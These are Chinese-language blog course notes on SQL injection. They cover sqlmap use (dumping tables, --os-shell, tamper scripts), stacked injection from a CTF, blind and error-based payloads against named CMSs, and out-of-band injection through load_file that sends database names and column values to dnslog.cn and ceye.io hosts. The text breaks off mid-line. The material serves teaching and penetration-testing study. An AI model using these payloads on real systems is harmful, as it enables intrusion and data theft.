title="数据猜解-库表列数据&amp;字典"></a>数据猜解-库表列数据&amp;字典</h2><p>(sqlmap:1. 字典文件路径..&#x2F;data&#x2F;txt&#x2F;<br>2. 注入日志路径C:&#x2F;Users&#x2F;PC登录账户&#x2F;AppData&#x2F;Local&#x2F;sqlmap&#x2F;outmap&#x2F;IP  注:同一IP再次注入时，需删掉之前的注入日志。)<br>测试：<a href="http://vulnweb.com/">http://vulnweb.com/</a>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--current-db    //非ACCESS数据库，查询当前数据库名</span><br><span class="line">--tables -D &quot;db_name&quot;</span><br><span class="line">--columns -T &quot;table_name&quot; -D &quot;db_name&quot;</span><br><span class="line">--dump -C &quot;column_name1,...&quot; -T &quot;table_name&quot; -D &quot;db_name&quot;</span><br></pre></td></tr></table></figure><h2 id="权限操作-文件-命令-交互式"><a href="#权限操作-文件-命令-交互式" class="headerlink" title="权限操作-文件&amp;命令&amp;交互式"></a>权限操作-文件&amp;命令&amp;交互式</h2><p>测试：MYSQL高权限注入<br>引出权限：<br><code>--is-dba --privileges</code><br>引出文件：<br><code>--file-read --file-write --file-dest </code><br>引出命令：<br><code>--os-cmd= --os-shell --sql-shell</code></p><h2 id="提交方法-POST-HEAD-JSON"><a href="#提交方法-POST-HEAD-JSON" class="headerlink" title="提交方法-POST&amp;HEAD&amp;JSON"></a>提交方法-POST&amp;HEAD&amp;JSON</h2><p>测试：Post Cookie Json  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--data &quot;&quot;</span><br><span class="line">--cookie &quot;&quot;</span><br><span class="line">-r 1.txt</span><br></pre></td></tr></table></figure><h2 id="绕过模块-Tamper脚本-使用-开发"><a href="#绕过模块-Tamper脚本-使用-开发" class="headerlink" title="绕过模块-Tamper脚本-使用&amp;开发"></a>绕过模块-Tamper脚本-使用&amp;开发</h2><p>测试：base64注入 有过滤的注入  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">--tamper=base64encode.py</span><br><span class="line">--tamper=test.py</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    if payload:      </span><br><span class="line">        payload = payload.replace(&#x27;SELECT&#x27;,&#x27;sElEct&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;OR&#x27;,&#x27;Or&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;AND&#x27;,&#x27;And&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;SLEEP&#x27;,&#x27;SleeP&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;ELT&#x27;,&#x27;Elt&#x27;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><h2 id="分析拓展-代理-调试-指纹-风险-等级"><a href="#分析拓展-代理-调试-指纹-风险-等级" class="headerlink" title="分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级"></a>分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级</h2><ul><li>1、后期分析调试：<br>-v&#x3D;(0-6)  #详细的等级(0-6)</li></ul><p><code>--proxy &quot;http://xx:xx&quot; #代理注入</code></p><ul><li>2、打乱默认指纹：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--user-agent &quot;&quot;  #自定义user-agent</span><br><span class="line">--random-agent   #随机user-agent</span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5</span><br></pre></td></tr></table></figure></li><li>3、使用更多的测试：测试Header注入  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>45WEB攻防-SQL注入</title>
      <link href="/2023/10/22/45WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/22/45WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>13、PHP-MYSQL-SQL注入-二次注入&amp;利用条件</li><li>14、PHP-MYSQL-SQL注入-堆叠注入&amp;利用条件</li><li>15、PHP-MYSQL-SQL注入-带外注入&amp;利用条件</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><p> <img src="/2023/10/22/45WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5.png"></p><h2 id="PHP-MYSQL-二次注入-DEMO-74CMS"><a href="#PHP-MYSQL-二次注入-DEMO-74CMS" class="headerlink" title="PHP-MYSQL-二次注入-DEMO&amp;74CMS"></a>PHP-MYSQL-二次注入-DEMO&amp;74CMS</h2><p>1、DEMO-用户注册登录修改密码<br>2、CMS-74CMS个人中心简历功能<br>黑盒思路：分析功能有添加后对数据操作的地方（功能点）<br>白盒思路：insert后进入select或update的功能的代码块<br>注入条件：插入时有转义函数或配置，后续有利用插入的数据<br>(PHP:addslashes转义函数,margic_quotes_gpc魔术引号开关–防止SQL注入，但是二次注入需要有转义或魔术引号配置)</p><h2 id="PHP-MYSQL-堆叠注入-DEMO-CTF强网"><a href="#PHP-MYSQL-堆叠注入-DEMO-CTF强网" class="headerlink" title="PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网"></a>PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL，所以要想目标存在堆叠注入,在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行.  </p><p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql等  </p><h3 id="2019强网杯-随便注（CTF题型）"><a href="#2019强网杯-随便注（CTF题型）" class="headerlink" title="2019强网杯-随便注（CTF题型）"></a>2019强网杯-随便注（CTF题型）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show databases;</span><br><span class="line">&#x27;;show tables;</span><br><span class="line">&#x27;;show columns from `1919810931114514`;</span><br><span class="line">&#x27;;select flag from `1919810931114514`;</span><br><span class="line">&#x27;;SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;(set @a - 自定义变量；prepare -准备要执行的语句；execute - 执行由prepare语句准备的预准备语句；deallocate prepare - 发布准备好的声明)</span><br></pre></td></tr></table></figure><p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句  </p><h2 id="PHP-MYSQL-带外注入-DEMO-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h2><ul><li>1.注入条件<br>ROOT高权限且支持load_file()<br>有部分注入点是没有回显的，所有读取也是没回显的，采用带外  </li><li>2.使用平台<br><a href="http://ceye.io/">http://ceye.io</a><br><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></li><li>3.带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.7logee.dnslog.cn\\aa&#x27;));</span><br><span class="line">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.69knl9.dnslog.cn/abc&#x27;)))</span><br><span class="line">// 查询当前数据库</span><br><span class="line">id=1 and load_file(concat(&quot;\\\\&quot;,database(),&quot;.dbuh8a.ceye.io\\asdt&quot;))</span><br><span class="line"></span><br><span class="line">//查询其他数据库</span><br><span class="line">id=1 and load_file(concat(&quot;\\\\&quot;,(select schema_name from information_schema.schemata limit 0,1),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">limit 0,1 查询第一个数据库名</span><br><span class="line">limit 1,1 查询第二个数据库名</span><br><span class="line">limit 2,1 查询第三个数据库名</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">//查询版本号</span><br><span class="line">id=1 and load_file(concat(&quot;\\\\&quot;,version(),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))</span><br><span class="line"></span><br><span class="line">//查询当前数据库demo01中第一个表名</span><br><span class="line">id=1 and load_file(concat(&quot;\\\\&quot;,(select table_name from information_schema.tables where table_schema=&#x27;demo01&#x27; limit 0,1 ),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">limit 0,1 查询第一个表名</span><br><span class="line">limit 1,1 查询第二个表名</span><br><span class="line">limit 2,1 查询第三个表名</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">//查询security数据库emails表下第一个列名</span><br><span class="line">id=1 and load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))</span><br><span class="line"></span><br><span class="line">//查询字段值  数据库名为security 表名emails 列名id</span><br><span class="line">id=1 and load_file(concat(&quot;\\\\&quot;,(select id from security.emails limit 0,1),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>44WEB攻防-SQL盲注</title>
      <link href="/2023/10/22/44WEB%E6%94%BB%E9%98%B2-SQL%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/10/22/44WEB%E6%94%BB%E9%98%B2-SQL%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>10、PHP-MYSQL-SQL注入-方式增删改查</li><li>11、PHP-MYSQL-SQL注入-布尔&amp;延迟&amp;报错</li><li>12、PHP-MYSQL-SQL注入-数据回显&amp;报错处理</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h2><ul><li>1、功能：数据查询</li></ul><p><code>查询：SELECT * FROM news where id=$id </code> </p><ul><li>2、功能：新增用户，添加新闻等</li></ul><p><code>增加：INSERT INTO news (字段名) VALUES (数据)  </code></p><ul><li>3、功能：删除用户，删除新闻等</li></ul><p><code>删除：DELETE FROM news WHERE id=$id  </code></p><ul><li>4、功能：修改用户，修改文章等</li></ul><p><code>修改：UPDATE news SET id=$id  </code></p><h2 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;盲注就是在注入过程中，获取的数据不能回显至前端页面。我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况  </p><h3 id="盲注分为以下三类："><a href="#盲注分为以下三类：" class="headerlink" title="盲注分为以下三类："></a>盲注分为以下三类：</h3><ul><li>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</li><li>2、基于时间的SQL盲注-延时判断<br>if,sleep</li><li>3、基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue<br>延迟：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and sleep(1);</span><br><span class="line">and if(1&gt;2,sleep(1),0);</span><br><span class="line">and if(1&lt;2,sleep(1),0);</span><br></pre></td></tr></table></figure>布尔：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and length(database())=7;</span><br><span class="line">and left(database(),1)=&#x27;p&#x27;;</span><br><span class="line">and left(database(),2)=&#x27;pi&#x27;;</span><br><span class="line">and substr(database(),1,1)=&#x27;p&#x27;;</span><br><span class="line">and substr(database(),2,1)=&#x27;i&#x27;;</span><br><span class="line">and ord(left(database(),1))=112;</span><br></pre></td></tr></table></figure>报错：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">0x7e --&gt; ~      0x5c --&gt; \</span><br></pre></td></tr></table></figure>更多：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a><br>参考：   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;                  #判断ro或ro...是否成立 </span><br><span class="line">regexp &#x27;^xiaodi[a-z]&#x27;       #匹配xiaodi及xiaodi...等</span><br><span class="line">if(条件,5,0)                #条件成立 返回5 反之 返回0</span><br><span class="line">sleep(5)                    #SQL语句延时执行5秒</span><br><span class="line">mid(a,b,c)                  #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)               #从位置b开始，截取字符串a的c长度</span><br><span class="line">left(database(),1)，database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8        #判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97       #判断x的ascii码是否等于97</span><br><span class="line">                           (ord表示开启数据库ascii编码开关)</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h2><p>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要<br><code>and if(1=1,sleep(5),0)</code><br>基于布尔：有数据库输出判断标准<br><code>and length(database())=6</code><br>基于报错：有数据库报错处理判断标准<br><code>and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code><br>测试delete注入：<br>（有无回显，有无报错）<br>删除（延迟）：<br><code>1 and if(1=1,sleep(5),0)</code><br>删除（布尔）：<br><code>3 and length(database())=6（无回显 无法判断注入）</code><br>删除（报错）：<br><code>4 and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code>  </p><h2 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h2><ul><li>1、xhcms-insert报错  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure></li><li>2、kkcms-delete延时  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and if(1=1,sleep(5),0)</span><br><span class="line">or if(1=1,sleep(5),0)</span><br><span class="line">or if(ord(left(database(),1))=107,sleep(2),0)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>43WEB攻防-SQL注入</title>
      <link href="/2023/10/22/43WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/22/43WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>7、PHP-MYSQL-SQL注入-数据请求类型</li><li>8、PHP-MYSQL-SQL注入-数据请求方法</li><li>9、PHP-MYSQL-SQL注入-数据请求格式</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="PHP-MYSQL-数据请求类型"><a href="#PHP-MYSQL-数据请求类型" class="headerlink" title="PHP-MYSQL-数据请求类型"></a>PHP-MYSQL-数据请求类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原SQL语句的未知性导致的拼接失败！<br>由于开发者对于数据类型和SQL语句写法（框架写法）导致SQL注入拼接失败  </p><ul><li>1、数字型(无符号干扰)</li></ul><p><code>select * from news where id=$id;</code></p><ul><li>2、字符型（有符号干扰）</li></ul><p><code>select * from news where id=&#39;$id&#39;;</code></p><ul><li>3、搜索型（有多符号干扰）</li></ul><p><code>select * from news where id like &#39;%$id%&#39;</code></p><ul><li>4、框架型（有各种符号干扰）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=(&#x27;$id&#x27;);</span><br><span class="line">select * from news where (id=&#x27;$id&#x27;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP-MYSQL-数据请求方法"><a href="#PHP-MYSQL-数据请求方法" class="headerlink" title="PHP-MYSQL-数据请求方法"></a>PHP-MYSQL-数据请求方法</h2><p>全局变量方法：GET POST SERVER FILES HTTP头等  </p><ul><li>User-Agent：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）  </li><li>Cookie：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据  </li><li>X-Forwarded-For：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）  </li><li>Rerferer：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器向 WEB 服务器表明自己是从哪个页面链接过来的  </li><li>Host：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号</li></ul><p>如功能点：<br>1、用户登录时<br>2、登录判断IP时<br>是PHP特性中的$_SERVER[‘HTTP_X_FORWARDED_FOR’];接受IP的绕过（绕过）<br>实现：代码配置固定IP去判断-策略绕过<br>实现：数据库白名单IP去判断-select注入<br>实现：防注入记录IP去保存数据库-insert注入<br>3、文件上传将文件名写入数据库-insert注入  </p><h2 id="PHP-MYSQL-数据请求格式"><a href="#PHP-MYSQL-数据请求格式" class="headerlink" title="PHP-MYSQL-数据请求格式"></a>PHP-MYSQL-数据请求格式</h2><p>1、数据采用统一格式传输，后端进行格式解析带入数据库（json）<br>2、数据采用加密编码传输，后端进行解密解码带入数据库（base64）  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>42WEB攻防-SQL注入</title>
      <link href="/2023/10/19/42WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/19/42WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>4、PHP-MYSQL-SQL注入-常规查询</li><li>5、PHP-MYSQL-SQL注入-跨库查询</li><li>6、PHP-MYSQL-SQL注入-文件读写</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="MYSQL注入：（目的获取当前web权限）"><a href="#MYSQL注入：（目的获取当前web权限）" class="headerlink" title="MYSQL注入：（目的获取当前web权限）"></a>MYSQL注入：（目的获取当前web权限）</h2><p>1、判断常见四个信息（系统，用户，数据库名，版本）<br>2、根据四个信息去选择方案<br>root用户：先测试读写，后测试获取数据<br>非root用户：直接测试获取数据  </p><h2 id="PHP-MYSQL-Web组成架构"><a href="#PHP-MYSQL-Web组成架构" class="headerlink" title="PHP-MYSQL-Web组成架构"></a>PHP-MYSQL-Web组成架构</h2><p>服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理<br>可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理  </p><ul><li>1、统一交root用户管理<br><a href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; root &#x3D;&gt;MYSQL<br><a href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; root &#x3D;&gt;MYSQL  </li><li>2、一对一用户管理（推荐）<br><a href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; zblog &#x3D;&gt;MYSQL<br><a href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; demo01 &#x3D;&gt;MYSQL</li></ul><h2 id="PHP-MYSQL-SQL常规查询"><a href="#PHP-MYSQL-SQL常规查询" class="headerlink" title="PHP-MYSQL-SQL常规查询"></a>PHP-MYSQL-SQL常规查询</h2><p>获取相关数据：<br>1、数据库版本-看是否符合information_schema查询 - version()<br>2、数据库用户-看是否符合ROOT型注入攻击 - user()<br>3、当前操作系统-看是否支持大小写或文件路径选择 - @@version_compile_os<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备 - database()  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MYSQL5.0以上版本：自带的数据库名information_schema  </span><br><span class="line">information_schema：存储数据库下的数据库名及表名，列名信息的数据库  </span><br><span class="line">information_schema.schemata：记录数据库名信息的表  </span><br><span 